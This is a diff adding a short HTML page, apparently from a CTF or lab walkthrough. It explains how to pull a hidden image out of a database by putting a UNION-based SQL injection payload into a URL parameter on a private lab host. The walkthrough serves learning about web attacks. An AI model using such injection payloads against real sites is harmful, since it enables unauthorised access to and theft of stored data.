@@ -1,0 +1,9 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.3 InjectIng the query into the URL</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  <script></script>
+</head>
+<body><div class="page"><h1 class="title">3.3 InjectIng the query into the URL</h1><br/><br />Now you have to get the “dsa32.jpg” image and you can do it injecting a query into the URL.<br /><br />1. Construst the query.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">union</span>&nbsp;<span style="color:#a52a2a;font-weight:700">select</span>&nbsp;<span style="color:#ff00ff;font-weight:400">1</span>,image,<span style="color:#ff00ff;font-weight:400">3</span>&nbsp;<span style="color:#a52a2a;font-weight:700">from</span>&nbsp;art<span style="color:#0000ff;font-weight:400">--+</span></div></div><br /><br />2. Create the URL and browse it.<br />    <div class="codebox"><div class="codebox">http://192.168.12.59/?tag='union&nbsp;select&nbsp;1,image,3&nbsp;from&nbsp;art--+</div></div><br />    <br />    <img src="images/966-1.png" alt="images/966-1.png" /><br /><br />3. Download the image.<p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
